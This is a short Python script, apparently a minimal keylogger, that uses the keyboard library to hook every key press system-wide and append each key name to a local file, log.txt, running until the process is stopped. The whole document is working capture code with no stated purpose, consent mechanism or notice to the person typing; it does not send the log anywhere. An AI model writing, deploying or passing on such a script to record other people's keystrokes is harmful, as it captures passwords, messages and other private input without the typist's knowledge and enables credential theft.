import keyboard


logFile='log.txt'

def basildiginda(event):
    with open(logFile,'a') as f:
        if event.name == 'space':
            f.write(' ')
        elif event.name == 'enter':
            f.write('\n')
        else:
            f.write('{} '.format(event.name))

keyboard.on_press(basildiginda)

keyboard.wait()